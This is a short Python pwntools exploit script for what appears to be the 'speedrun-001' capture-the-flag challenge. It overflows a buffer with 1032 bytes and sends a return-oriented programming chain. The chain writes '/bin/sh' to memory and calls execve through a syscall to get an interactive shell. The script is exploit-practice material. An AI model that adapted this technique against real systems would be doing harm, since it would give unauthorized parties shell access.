from pwn import * 


p=process("./speedrun-001")

#pop rax (0x3b)
#pop rdi (/bin/sh)
#pop rsi
#pop rdx

#GADJETS
pop_rdi = 0x400686  #: pop rdi ; ret
pop_rax = 0x415664  #: pop rax ; ret
pop_rsi = 0x4101f3  #: pop rsi ; ret 
pop_rdx = 0x4498b5  #: pop rdx ; ret

syscall = 0x40129c  #: syscall

#gadjets to write /bin/sh
bin_sh = 0x0068732f6e69622f #: /bin/sh\x00
movGadjet = 0x435603        #: mov qword ptr [rdi], rdx ; ret
memory = 0x6bc010

#offset
payload = ''
payload += 'a' * 1032

#write /bin/sh into writable memory
payload += p64(pop_rdi)
payload += p64(memory)
payload += p64(pop_rdx)
payload += p64(bin_sh)
payload += p64(movGadjet)

#syscall
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(memory)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)

payload += p64(syscall)





p.recvuntil("Any last words?")
p.sendline(payload)
p.interactive()
